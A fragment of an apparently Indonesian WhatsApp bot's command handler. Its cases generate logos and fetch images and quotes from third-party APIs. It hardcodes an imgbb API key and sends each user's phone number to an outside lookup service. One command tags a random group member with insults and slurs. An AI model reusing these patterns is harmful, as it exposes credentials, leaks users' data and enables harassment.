itsmevall.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case 'lolimaker':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(9)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
girlneko = await getBuffer(`https://apidhani.herokuapp.com/api/maker/lolimaker?apikey=${dhakey}&text=${F1}&text2=${F2}`)
itsmevall.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
case 'gura':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(5)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
reply(mess.wait)
girlneko = await getBuffer(`https://apidhani.herokuapp.com/api/maker/gura?apikey=${dhakey}&text=${F1}&text2=${F2}`)
itsmevall.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
limitAdd(sender, limit)
break
//══════════[ APIKEY ALPHA ]════════════════════════════//
case 'blackpink':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/blackpink?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'pipe':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/water_pipe?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'heloween':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/halloween?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'heloween2':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/halloween2?text=${query}&text2=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'horor':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/horror?text=${query}&text2=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'nulis':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/sketch?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'sirkuit':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/sircuit?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'discovery':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/discovery?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'fiction':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/fiction?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case '8bit':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/game8bit?text=${query}&text2=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'demon':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/demon?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'transformer':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/transformer?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'berry':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/berry?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'leyered':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/layered?text=${query}&text2=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'thunder':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/thunder?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'magma':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/magma?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'stone':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/3dstone?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'neon3':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/neon?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'glitch':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/glitch?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'glitch2':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/glitch2?text=${query}&text2=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'herrypoter':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/harry_potter?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'embosed':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/embossed?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'broken':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/broken?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'nulis2':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/papercut?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'gradient':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/gradient?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'glossy':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/glossy?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'watercolor':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/watercolor?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'multicolor':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/multicolor?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'neondevil':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/neon_devil?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'underwater':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/underwater?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'bear':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/bear?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'glitter7':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/glitter7?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
case 'metale':
if (isBanned) return reply(mess.ban)
if (args.length < 1) return reply(`Nama yang mau di tulis?\nContoh: ${prefix + command} Kontol`)
reply(mess.wait)
query = args.join (" ")
bf = await getBuffer(`https://api-alphabot.herokuapp.com/api/textpro/metale?text=${query}&apikey=${AlphaBot}`)
itsmevall.sendMessage(from, bf, image, { quoted: mek, caption: 'Logo maker' })
break
//══════════[ ANIMASI HEWAN ]════════════════════════════//
                   case 'fox':  
                   if (isBanned) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/fox`)
                   anu1 = await getBuffer(anu.link)
                   itsmevall.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
                   break
                   case 'dog':  
                   if (isBanned) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/dog`)
                   anu1 = await getBuffer(anu.link)
                   itsmevall.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
                   break
                   case 'cat':
                   if (isBanned) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/cat`)
                   anu1 = await getBuffer(anu.link)
                   itsmevall.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
                   break
                   case 'panda':  
                   if (isBanned) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/panda`)
                   anu1 = await getBuffer(anu.link)
                   itsmevall.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
                   break
                   case 'panda1':  
                   if (isBanned) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/red_panda`)
                   anu1 = await getBuffer(anu.link)
                   itsmevall.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
                   break
                   case 'bird': 
                   if (isBanned) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/birb`)
                   anu1 = await getBuffer(anu.link)
                   itsmevall.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
                   break
                   case 'koala':  
                   if (isBanned) return reply(mess.ban)
                   anu = await fetchJson(`https://some-random-api.ml/img/koala`)
                   anu1 = await getBuffer(anu.link)
                   itsmevall.sendMessage(from, anu1, image, {caption: `nih kak mirip kamu`, quoted: mek})
                   break
case 'wallpaperhacker':
case 'wallpaperharley':
case 'wallpaperjoker':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
oke = await getBuffer(`https://apidhani.herokuapp.com/api/random/${command}?apikey=${dhakey}`)
buttons = [{buttonId: `cecan`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(oke, "imageMessage", { thumbnail: oke, })).imageMessage
              buttonsMessage = {footerText:'©Realzibot', imageMessage: imageMsg,
              contentText:`Random Wallpaper`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:"https://youtu.be/Ejl9sLbgc1A"}}})
              itsmevall.relayWAMessage(prep)
              limitAdd(sender, limit)
        break
case 'quotesimage':
case 'renungan':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/random/${command}?apikey=${dhakey}`)
oke = await getBuffer(anu.result)
buttons = [{buttonId: `cecan`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(oke, "imageMessage", { thumbnail: oke, })).imageMessage
              buttonsMessage = {footerText:'©Realzibot', imageMessage: imageMsg,
              contentText:`Random quotes image`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:"https://youtu.be/Ejl9sLbgc1A"}}})
              itsmevall.relayWAMessage(prep)
              limitAdd(sender, limit)
        break      
case "deltrash":
if (isBanned) return reply(mess.ban)
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          reply("Loading.....");
          owgi = await itsmevall.downloadAndSaveMediaMessage(ted);
          //	  console.log(owgi)
          anu = await imgbb("3395a377ebac7e9f744c3683b44a2a59", owgi);
          console.log(anu);
          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/deltrash?imgurl=${anu.display_url}`
          );
          itsmevall.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        }
        break;
        case "semoji":
        if (isBanned) return reply(mess.ban)
          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted:mek})
        if (!q) return reply("emojinya?\nExample : /emoji 🗿");
        qes = args.join(" ");
        emoji.get(`${qes}`).then((emoji) => {
          teks = `${emoji.images[4].url}`;
          sendStickerFromUrl(from, `${teks}`);
          console.log(teks);
        });
        break;
        case 'cekmati':
        if (isBanned) return reply(mess.ban)
              if (!q) return reply(mess.wrongFormat)
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
              break
              case 'cogan':
case 'indonesia':
case 'vietnam':
case 'thailand':
case 'korea':
case 'china':
case 'japan':
case 'malaysia':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
cecan = await getBuffer(`https://apidhani.herokuapp.com/api/cecan/${command}?apikey=${dhakey}`)
itsmevall.sendMessage(from, cecan, image, {quoted: mek, caption: '_Nih Kak_'})
limitAdd(sender, limit)
break
              case 'puisi':
case 'faktaunik':
case 'katabijak':
case 'katailham':
case 'katasindiran':
case 'katabucin':
case 'katabucin2':
case 'quotesislami':
case 'quotesanime':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
oke = await fetchJson(`https://apidhani.herokuapp.com/api/random/${command}?apikey=${dhakey}`)
dhani = (oke.result)
sendButMessage(from, dhani, `Klik Untuk Ke ${command} Selanjutnya`, [
{
buttonId: `${prefix + command}`,
buttonText: {
displayText: `ɴᴇxᴛ`,
},
type: 1,
},]);
limitAdd(sender, limit)
break;
case 'wallpapermuslim':
case 'wallpapercyberspace':
case 'wallpapermountain':
case 'wallpaperprogramming':
case 'wallpapertechnology':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
anu = await fetchJson(`https://apidhani.herokuapp.com/api/other/${command}?apikey=${dhakey}`)
oke = await getBuffer(anu.result)
itsmevall.sendMessage(from, oke, image, {quoted: mek, caption: '_Nih Kak_'})
limitAdd(sender, limit)
break
case 'leavetime':
                case 'faktaunik':
                case 'katabijak':
                case 'pantun':                
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolkey}`)
                   titid = get_result.result
                   sendButMessage(from, titid, `Klik Untuk Ke Quotes Selanjutnya`, [
          {
            buttonId: `${prefix + command}`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
        break;
                    break
                case 'pantun2':
            
				anu = await fetchJson(`https://api.lolhuman.xyz/api/random/pantun?apikey=${lolkey}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break    
                case 'randomnama':
                    anu = await fetchJson(`https://api.lolhuman.xyz/api/random/nama?apikey=${setting.lolkey}`)
                    kyyi = anu.result
                   sendButMessage(from, kyyi, `Klik Untuk Ke Quotes Selanjutnya`, [
          {
            buttonId: `${prefix + command}`,
            buttonText: {
              displayText: `⬡ NEXT `,
            },
            type: 1,
          },]);
        break;
                    break
                    case 'bego':
      case 'tolol':
      case 'pinter':
      case 'pintar':
      case 'asu':
      case 'bodoh':
      case 'gay':
      case 'lesby':
      case 'bajingan':
      case 'jancok':
      case 'anjing':
      case 'ngentod':
      case 'ngentot':
      case 'monyet':
      case 'mastah':
      case 'newbie':
      case 'bangsat':
      case 'bangke':
      case 'sange':
      case 'sangean':
      case 'dakjal':
      case 'horny':
      case 'wiu':
      case 'puki':
      case 'pantex':
      case 'pantek':
      
      if (!isGroup) return reply(mess.only.group)  
        teks = `*Yang Paling ${command} Disini Adalah :* @${goo.jid.split('@')[0]} Damsarr ${command}`
        membr.push(goo.jid)
        mentions(teks, membr, true)
        break                   
             
                    // Textprome //
              case 'storyanime': case 'sanime':{
              if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
reply(mess.wait)
get_result = await getBuffer(`https://dapuhy-api.herokuapp.com/api/anime/storyanime?apikey=${dapapi}`)
kodi = `*_CLICK NEXT UNTUK SELANJUTNYA_*`
   sendButVideo(from, kodi, `${watermark}`, get_result, [                      
          {
            buttonId: `${prefix+command}`,
            buttonText: {
              displayText: `NEXT`,
            },
            type: 1,
          },
        ]);         
        }
                    break
                    case 'clearall':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					anu = await itsmevall.chats.all()
					itsmevall.setMaxListeners(26)
					for (let _ of anu) {
						itsmevall.deletechat(_.jid)
					}
					reply('Sukses membersihkan semua pesan')
					break
                    case 'status':
                              return reply('_ONLINE_')
                    case 'botstat':
      case 'botstats':
      case 'statusbot':
      case 'infobot':
      case 'stats':
      case 'stat':
      case 'statice':
      case 'botstatus':
      if (isBanned) return reply(mess.ban)
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
              stats = await getBuffer(`https://telegra.ph/file/f0758ad3f93835a86d1fb.jpg`);
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `*BOT STATISTICS*
\`\`\` Group Chats : ${groups.length}\`\`\`
\`\`\` Private Chats : ${privat.length}\`\`\`
\`\`\` Total Chats : ${totalChat.length}\`\`\`
\`\`\` Speed : ${latensie.toFixed(4)} _Second_\`\`\`
\`\`\` Active Time : ${kyun(uptime)}\`\`\`

\`\`\`PHONE STATISTICS\`\`\`
\`\`\` Ram Usage : ${ram2}\`\`\`
\`\`\` Platform : ${os.platform()}\`\`\`
\`\`\` Hostname : ${os.hostname()}\`\`\`
\`\`\` Uptime : ${runtime(process.uptime())}\`\`\`
\`\`\` Wa Version: ${itsmevall.user.phone.wa_version}\`\`\`
\`\`\` Os Version: ${itsmevall.user.phone.os_version}\`\`\`
\`\`\` Device Manufacturer: ${itsmevall.user.phone.device_manufacturer}\`\`\`
\`\`\` Device Model: ${itsmevall.user.phone.device_model}\`\`\`
\`\`\` Os Build Number: ${itsmevall.user.phone.os_build_number}\`\`\``
sendButLocation(from, `${menu}`,`Active : ${latensie.toFixed(4)} _Second_ : ${runtime(process.uptime())}`, {jpegThumbnail:stats}, [{buttonId:`${prefix}cekme`,buttonText:{displayText:'Chekme🐣'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case '#profile':
case 'me': 
case 'myinfo': 
case 'info': 
case 'profile': 
case 'profil':
case 'profil2':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
if (!isGroup) return reply("Khusus di grup");
try {
              profil = await itsmevall.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
              } catch {
              profil = errorImg
}
              thu = await itsmevall.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
              me = itsmevall.user
              uptime = process.uptime()
              buff = await getBuffer(profil)
caption = `-----[ *USER INFO* ]-----\n\n➸ *Username:* ${pushname}\n➸ *Status:* ${thu.status}\n➸ *Premium*: ${isPremium ? 'Ya' : 'No'}\n➸ *Terdaftar*: ${isRegistered ? 'Ya' : 'No'}\n➸ *Terbaned*: ${isBanned ? 'Ya' : 'No'}\n➸ *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}\n➸ *Prefix :* Multi Prefix\n\n=_=_=_=_=_=_=_=_=_=_=_=_=\n\nYour progress:\n➸ *Limit*: ${getLimit(sender, limitCount, limit)}\n➸ *Balance*: ${getBalance(sender, balance)}\n➸ *Level*: 0-1\n➸ *XP*: 0 / 1`
sendButLocation(from, `${caption}`,`© REALZIBOT`, {jpegThumbnail:buff}, [{buttonId:`${prefix}cekme`,buttonText:{displayText:'Chekme🐣'},type:1}], {contextInfo: { mentionedJid: [sender,owner]}})
limitAdd(sender, limit)
break				                                               
case 'quotesyt':
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
                reply(mess.wait)
                dapuhy = await getBuffer(`https://dapuhy-api.herokuapp.com/api/randomimage/quotesyt?apikey=${dapapi}`)
                itsmevall.sendMessage(from, dapuhy, image, {quoted: mek})        
                break    
case 'auu': // by itsmevall
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
       reply('Enggak Kak')
        sendButMessage(from, `Hai Kak ${pushname} 🐤`, `Mau Jawab Apa?`, [
          {
            buttonId: `${prefix}oklah`,
            buttonText: {
              displayText: `kok gitu sih:)`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}apaan6`,
            buttonText: {
              displayText: `Dahlah`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}awokkk`,
            buttonText: {
              displayText: `end:/`,
            },
            type: 1,
          },
        ]);
        break;       
case 'oklah':
reply(':v')
break
case 'apaan6':
reply('oke slur')
break
case 'awokkk':
reply('iyalah masa engga')
break

case 'isbaileys': 
case 'bail': 
case 'baileys':
if (isBanned) return reply(mess.ban)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
if (!mek.key.fromMe) return;
reply(`${mek.quoted.isBaileys}`)
break
case 'getcaption':
if (isBanned) return reply(mess.ban)
try {
reply(`${mek.quoted.title}`)
} catch {
reply(`${mek.quoted.caption}`)
}
break
case 'iggw':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
  reply('https://instagram.com/@spnx.fauzi')
break
case 'owner':
case '#owner':
case 'creator':
case 'author':
if (isBanned) return reply(mess.ban)             
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
               sendKontak(from, `${owner}`, `${fakeyoi}`, 'Sibukk!!')
               await sleep(1000)
               reply(`Hai Kak ${pushname}\nItu Ownerku, Mau tau soal apa ya?`)              
               break
            
